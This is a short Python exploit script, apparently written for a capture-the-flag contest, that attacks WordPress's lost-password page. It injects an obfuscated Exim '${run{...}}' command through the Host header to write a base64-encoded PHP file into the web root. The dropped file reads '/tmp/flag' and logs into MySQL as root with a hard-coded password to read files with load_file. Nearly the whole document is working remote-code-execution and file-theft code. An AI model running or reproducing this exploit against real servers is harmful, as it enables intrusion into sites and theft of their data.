import requests
import base64

flag_php = '''
<?php
error_reporting(0);
echo file_get_contents("/tmp/flag") . ',';

$servername = "172.16.10.3";
$username = "root";
$password = "root";
$dbname = "wordpress";
 
$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Error: " . $conn->connect_error);
} 
 
$sql = "SELECT load_file('/tmp/flag')";
$result = $conn->query($sql);
 
if ($result->num_rows > 0) {
    while($row = $result->fetch_row()) {
        echo $row[0];
    }
}

$conn->close();
'''

def generate_command(command):
    command = '${run{%s}}' % command
    command = command.replace('/', '${substr{0}{1}{$spool_directory}}')
    command = command.replace(' ', '${substr{10}{1}{$tod_log}}')
    return 'target(any -froot@localhost -be %s null)' % command

def attack(target):
    target = "http://" + target
    user = 'ichunqiu'
    session = requests.session()
    data = {
        'user_login': user,
        'redirect_to': '',
        'wp-submit': 'Get New Password'
    }
    session.headers = {
        'Host': generate_command(f'/usr/bin/echo {base64.b64encode(flag_php.encode())} | /usr/bin/base64 -d > /var/www/html/flag.php'),
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
    }
    session.allow_redirects = False
    session.post(target + '/wp-login.php?action=lostpassword', data = data)
    flags = [i.strip() for i in session.get(target + '/flag.php').content.split(',')]
    for flag in flags:
        print(flag)
    return flags

# if __name__ == "__main__":
#     attack('172.16.9.20')
